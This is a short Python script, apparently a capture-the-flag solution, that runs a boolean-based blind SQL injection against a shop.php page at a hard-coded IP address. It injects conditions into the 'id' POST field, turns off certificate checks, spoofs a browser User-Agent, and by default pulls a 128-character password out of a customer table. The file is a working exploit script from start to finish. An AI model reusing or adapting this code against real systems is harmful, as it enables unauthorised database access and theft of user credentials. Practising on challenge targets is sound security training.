#!/usr/bin/env python3
# coding: utf-8

import requests
from blind_sqli import BlindSQLI

class Challenge(BlindSQLI):
    URL     = "https://46.105.49.65/1cd6009637ab/shop.php"
    PAYLOAD = "1 AND {condition}"
    PATTERN = "Park County Fair sells the following items:"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        requests.packages.urllib3.disable_warnings()

    def check(self, condition):
        payload = self.PAYLOAD.format(condition=condition)

        result = requests.post(self.URL, data={
            "id": payload
        }, headers={
            "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                           " (KHTML, like Gecko)"
                           " Chrome/64.0.3282.186 Safari/537.36")
        }, verify=False)

        return self.PATTERN.encode("utf-8") in result.content

if __name__ == "__main__":
    import sys
    import logging

    logging.basicConfig(level=logging.INFO)

    query = (sys.argv[1] if len(sys.argv) >= 2
             else ("(select password from customer where "
                   "length(password)=128)"))

    Challenge().getQueryResult(query)
